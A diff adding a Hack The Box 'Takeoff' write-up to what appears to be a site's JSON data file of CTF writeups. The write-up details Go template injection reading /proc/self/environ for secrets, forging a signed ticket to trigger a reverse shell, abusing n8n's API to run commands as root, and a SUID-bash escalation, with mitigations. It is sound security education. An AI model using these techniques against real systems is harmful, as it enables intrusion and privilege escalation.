@@ -1,5 +1,5 @@
 {
- "generated": "2026-11-16",
+ "generated": "2026-11-17",
  "writeups": [
   {
    "slug": "ra",
@@ -65,6 +65,70 @@
    ],
    "takeawayHtml": "Every stage of Ra is the system trusting input it should have treated as hostile: the reset form trusts a security answer that is printed on the website, the chat client trusts a link enough to authenticate for it, and a SYSTEM script trusts a file any user owns. Privilege boundaries don't fail at the exploit — they fail at the point where privileged code reads attacker-controlled data.",
    "againHtml": "<p>Read the filenames before touching the reset form. The whole foothold is in the directory's image names — <code>username</code> + answer — and spotting the pattern first would have saved every failed <code>lily</code> attempt.</p>\n<p>Go straight for the SYSTEM task on privilege escalation. Once <code>buse</code> is in, <code>C:\\scripts</code> and a <code>Get-ScheduledTask</code> are the fastest tell; the script's <code>Invoke-Expression</code> on a profile-local file is the whole box, and the only question is which identity can write that file.</p>\n<p>Get the payload syntax right the first time — <code>;net user &lt;u&gt; &lt;p&gt; /add;net localgroup Administrators &lt;u&gt; /add</code> — and confirm the account exists with <code>nxc smb</code> before burning WinRM attempts on a login that was never going to work.</p>"
+  },
+  {
+   "slug": "takeoff",
+   "title": "Takeoff",
+   "platform": "Hack The Box",
+   "difficulty": "Hard",
+   "date": "2026-11-17",
+   "github": "https://github.com/thecyberfarhan/CTF-Writeups/blob/main/HackTheBox/takeoff_writeup.md",
+   "summary": "Takeoff is a Go (Echo) airline-booking app, HTB Airways. The ticket PDF renders a user-controlled notes field through Go's text/template, which is…",
+   "takeaway": "Every stage of Takeoff is a trust boundary crossed by data that should have stayed inert: a note that becomes code, an environment that hands out its own secrets, a signature that is trusted to authorise a command, and an internal tool that executes as root for anyone with its key. A valid signature proves who sent data, never that the data is safe to run.",
+   "tldrHtml": "Takeoff is a Go (Echo) airline-booking app, <strong>HTB Airways</strong>. The ticket PDF renders a user-controlled <strong>notes</strong> field through Go's <code>text/template</code>, which is server-side template injection. The template exposes a <code>File</code> method, so <code>{{.File &quot;/proc/self/environ&quot;}}</code> reads the process environment and leaks two secrets: <code>TICKET_VALIDATION_TOKEN</code> and <code>N8N_API_KEY</code>. The check-in flow verifies a ticket QR that is a Go <strong><code>gob</code>-encoded, HMAC-signed</strong> structure containing, among other fields, a <strong><code>NotifyCmd</code></strong> string the server executes. With the leaked validation token I can sign my own ticket, so I forge one whose <code>NotifyCmd</code> is a bash reverse shell and submit it at check-in — RCE as <strong><code>www-data</code></strong>. From <code>www-data</code>, the box is wired together by internal services on localhost: the app on 3000, <strong>n8n</strong> on 5678, MySQL on 3306. The leaked <code>N8N_API_KEY</code> lets me talk to n8n's public API and create a workflow with an <strong><code>executeCommand</code></strong> node. That node runs with <strong>root</strong> privileges, so it reads the user flag and lets me drop a SUID-root <code>bash</code>; running it gives a root shell and <code>root.txt</code>. ",
+   "tools": [
+    "RustScan / Nmap",
+    "whatweb",
+    "Burp / browser dev tools",
+    "zbarimg",
+    "Go (encoding/gob, crypto/hmac)",
+    "curl",
+    "A reverse shell + nc"
+   ],
+   "sections": [
+    {
+     "id": "introduction",
+     "label": "Introduction",
+     "html": "<p>The theme of Takeoff is trusting data that crosses a boundary. The app trusts a user's note enough to run it through a template engine, it trusts any ticket whose signature validates, and an internal automation tool (n8n) is reachable with a leaked key and runs commands as root. Each step is the same mistake in a new place.</p>\n<p>Two open ports, one web app, and a path that goes: template injection → secret leak → forged-signature RCE → internal API → root.</p>"
+    },
+    {
+     "id": "recon",
+     "label": "Recon",
+     "html": "<p>A full RustScan/Nmap sweep shows just two ports:</p>\n<pre><code class=\"language-bash\">rustscan -a 10.129.211.87 --ulimit 5000 -r 1-65535 -- -Pn -sV</code></pre>\n<pre><code>22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)\n80/tcp open  http    nginx</code></pre>\n<p><code>whatweb</code> fingerprints the web stack — nginx in front of a Go app using the <strong>Echo</strong> framework:</p>\n<pre><code class=\"language-bash\">whatweb http://10.129.211.87/\n# Title[Book a Seat, See the World - HTB Airways Booking], HTTPServer[nginx], X-Powered-By[Echo]</code></pre>\n<p>I added <code>takeoff.htb</code> to my hosts file and registered an account. The site is a full airline-booking flow: search flights, book, and download a <strong>ticket PDF</strong>. The important design detail: the booking form has a free-text <strong>notes</strong> field that ends up rendered inside the generated PDF.</p>"
+    },
+    {
+     "id": "foothold",
+     "label": "Foothold",
+     "html": "<p>The hint the box gives you is to look at the *document*, not the web page. The ticket notes are rendered server-side into the PDF through Go's <code>text/template</code>, so the field is a template-injection sink.</p>\n<p>Putting <code>{{.}}</code> in the notes and downloading the ticket returns Go's default struct rendering:</p>\n<pre><code>{0xc0002e4640 0xc0003dab80}</code></pre>\n<p>Those are struct pointers — confirmation the field is evaluated as a template. The data object also exposes a <code>File</code> method, which turns the SSTI into an arbitrary file read. Reading the process environment:</p>\n<pre><code>{{.File &quot;/proc/self/environ&quot;}}</code></pre>\n<p>returns the server's environment, and with it two secrets:</p>\n<pre><code>USER=www-data\nTICKET_VALIDATION_TOKEN=JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR\nN8N_API_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</code></pre>\n<p><code>TICKET_VALIDATION_TOKEN</code> is the HMAC key the app uses to sign tickets; <code>N8N_API_KEY</code> is a public-API token for an n8n instance. Both matter later.</p>"
+    },
+    {
+     "id": "shell",
+     "label": "Shell and access",
+     "html": "<p>Decoding a real ticket's QR with <code>zbarimg</code> shows the structure the check-in endpoint expects:</p>\n<pre><code class=\"language-bash\">zbarimg htb-airways-5JVNFV-6.pdf</code></pre>\n<p>It is a Go <strong><code>gob</code></strong> stream wrapping a <code>VerifyTicketAuthenticity{ Data }</code> value, where <code>Data</code> is the ticket JSON followed by an HMAC. The JSON is the interesting part:</p>\n<pre><code class=\"language-json\">{&quot;PNR&quot;:&quot;5JVNFV&quot;,&quot;Token&quot;:&quot;...&quot;,&quot;Seat&quot;:&quot;2B&quot;,&quot;Passenger&quot;:&quot;tester a&quot;,&quot;NotifyCmd&quot;:&quot;check-in-notify --pnr 5JVNFV --email abcd@gmail.com&quot;}</code></pre>\n<p>On check-in the server <strong>executes <code>NotifyCmd</code></strong>. It normally runs the app's own notifier, but the field is attacker-controllable as long as the whole blob carries a valid HMAC — and I have the signing token.</p>\n<p>So I forge my own ticket: a tiny Go program that <code>gob</code>-encodes a <code>VerifyTicketAuthenticity</code> whose <code>Data</code> is my JSON (with <code>NotifyCmd</code> set to a reverse shell), appends an HMAC computed with the leaked <code>TICKET_VALIDATION_TOKEN</code>, and base64-encodes it. Getting the <code>gob</code> wire format byte-identical took a few tries (the original wraps an interface and registers the type under the <code>gob</code> package path, and <code>Data</code> is <code>[]byte</code>, not <code>string</code>), but once the header matched, the server accepted it.</p>\n<p>Submitting the forged blob to the check-in endpoint (the field is <code>qr_data</code>, form-encoded) fires the reverse shell:</p>\n<pre><code class=\"language-bash\">curl -s http://takeoff.htb/.../checkin --data-urlencode &quot;qr_data=&lt;forged-base64&gt;&quot;</code></pre>\n<pre><code>www-data@takeoff:/opt/htb-airways/booking$ id\nuid=33(www-data) gid=33(www-data)</code></pre>"
+    },
+    {
+     "id": "escalation",
+     "label": "Escalation",
+     "html": "<p>From <code>www-data</code>, the listening sockets tell the story — everything else is bound to localhost:</p>\n<pre><code class=\"language-bash\">ss -ltnp</code></pre>\n<pre><code>127.0.0.1:3000   htb-air        # the Go app\n127.0.0.1:5678   n8n            # workflow automation\n127.0.0.1:3306   mysql</code></pre>\n<p>n8n on 5678 is the target, and I already leaked its public-API key from <code>/proc/self/environ</code>. The key authenticates straight to the API:</p>\n<pre><code class=\"language-bash\">curl -s http://127.0.0.1:5678/api/v1/workflows -H &quot;X-N8N-API-KEY: eyJ...&quot;</code></pre>\n<p>n8n workflows can contain an <strong><code>executeCommand</code></strong> node, which runs a shell command on the host. Creating a workflow with a webhook trigger and a command node, then calling the webhook, runs whatever I want — and on this box that node runs as <strong>root</strong> (a <code>chown root:root</code> through it succeeds).</p>"
+    },
+    {
+     "id": "chain",
+     "label": "The full chain",
+     "html": "<p>Create a workflow (webhook → <code>executeCommand</code>) through the API, then trigger it:</p>\n<pre><code class=\"language-bash\">curl -s -X POST http://127.0.0.1:5678/api/v1/workflows \\\n  -H &quot;X-N8N-API-KEY: eyJ...&quot; -H 'Content-Type: application/json' \\\n  -d '{&quot;name&quot;:&quot;pwn&quot;,&quot;nodes&quot;:[\n        {&quot;parameters&quot;:{&quot;httpMethod&quot;:&quot;POST&quot;,&quot;path&quot;:&quot;pwn-x&quot;,&quot;responseMode&quot;:&quot;lastNode&quot;},&quot;id&quot;:&quot;wh1&quot;,&quot;name&quot;:&quot;Webhook&quot;,&quot;type&quot;:&quot;n8n-nodes-base.webhook&quot;,&quot;typeVersion&quot;:2,&quot;position&quot;:[200,300]},\n        {&quot;parameters&quot;:{&quot;command&quot;:&quot;cat /root/user.txt&quot;},&quot;id&quot;:&quot;cmd1&quot;,&quot;name&quot;:&quot;Exec&quot;,&quot;type&quot;:&quot;n8n-nodes-base.executeCommand&quot;,&quot;typeVersion&quot;:1,&quot;position&quot;:[420,300]}\n      ],&quot;connections&quot;:{&quot;Webhook&quot;:{&quot;main&quot;:[[{&quot;node&quot;:&quot;Exec&quot;,&quot;type&quot;:&quot;main&quot;,&quot;index&quot;:0}]]}},&quot;settings&quot;:{}}'\n\ncurl -s -X POST http://127.0.0.1:5678/webhook/pwn-x -H 'Content-Type: application/json' -d '{}'</code></pre>\n<p>That returns the <strong>user flag</strong>. To turn root-level command execution into a stable interactive root shell, copy <code>bash</code>, then use the same node (running as root) to make it SUID root, and run it:</p>\n<pre><code class=\"language-bash\"># as the low-priv user\ncp /bin/bash /home/kpark/bash\n\n# via the n8n command node (root):\nchown root:root /home/kpark/bash &amp;&amp; chmod 4755 /home/kpark/bash</code></pre>\n<pre><code class=\"language-bash\">/home/kpark/bash -p</code></pre>\n<pre><code>bash-5.2# id\nuid=1001 euid=0(root)\nbash-5.2# cat /root/root.txt</code></pre>"
+    },
+    {
+     "id": "rabbit-holes",
+     "label": "Rabbit holes",
+     "html": "<p><strong>The QR looks like a pcap / crypto puzzle.</strong> It is neither — it is a Go <code>gob</code> stream. Trying to treat the base64 as a generic structure wastes time; recognising the <code>gob</code> type header (<code>VerifyTicketAuthenticity</code>) is what unlocks it.</p>\n<p><strong>Encoding the forged ticket as a bare struct or from package <code>main</code>.</strong> <code>gob</code> embeds the full type path and interface markers. A payload encoded as <code>main.VerifyTicketAuthenticity</code>, or as a concrete struct when the original wrapped an interface, is rejected with <code>gob decode: ... can only be decoded from remote interface type</code>. The forge has to register the type under the same package path and encode <code>Data</code> as <code>[]byte</code>.</p>\n<p><strong>Sending the ticket as JSON.</strong> The check-in endpoint wants a form field named <code>qr_data</code>; a JSON body gives <code>payload too short</code>. Grab the exact field name from dev tools on a normal check-in.</p>"
+    },
+    {
+     "id": "mitigations",
+     "label": "Mitigations",
+     "html": "<p><strong>Never render user input as a template.</strong> The notes field is concatenated into a <code>text/template</code> that is then executed, which is SSTI and, via the exposed <code>File</code> method, arbitrary file read. Treat user input as data: render it with a context that escapes, never <code>Parse</code>/<code>Execute</code> a string built from it, and never expose filesystem helpers to the template.</p>\n<p><strong>Don't put secrets in the environment of a process that can leak them.</strong> One file read handed over the signing key and an API token. Secrets belong in a secrets manager or a file the app reads once and drops, not in <code>/proc/self/environ</code> where a single read-primitive exposes everything.</p>\n<p><strong>Sign the whole payload and don't execute fields from it.</strong> The ticket's <code>NotifyCmd</code> is executed server-side; a valid HMAC should authenticate *data*, not authorise *commands*. The notifier should pick from a fixed set of actions by id, never run a command string carried in the ticket — even a signed one.</p>\n<p><strong>Lock down the automation tool.</strong> n8n was reachable with a leaked key and its <code>executeCommand</code> node ran as root. Scope API keys tightly, disable <code>executeCommand</code>/community nodes where not needed, and run the service as an unprivileged user so a workflow compromise is not an instant root.</p>"
+    }
+   ],
+   "takeawayHtml": "Every stage of Takeoff is a trust boundary crossed by data that should have stayed inert: a note that becomes code, an environment that hands out its own secrets, a signature that is trusted to authorise a command, and an internal tool that executes as root for anyone with its key. A valid signature proves who sent data, never that the data is safe to run.",
+   "againHtml": "<p>Read the PDF's data model first. The <code>{{.}}</code> probe instantly shows it is a Go template over a struct; checking for a <code>File</code>/<code>Env</code> method on that struct is faster than blind payload lists.</p>\n<p>Dump <code>/proc/self/environ</code> the moment I have any file read on a service — it is the shortest path to signing keys and API tokens, and here it held both.</p>\n<p>Recognise <code>gob</code> by its type header before writing any forge code, and mirror the original's package path and interface wrapper from the start so the server's <code>Decode</code> accepts the first forged payload instead of the fifth.</p>"
   },
   {
    "slug": "anonymousplayground",
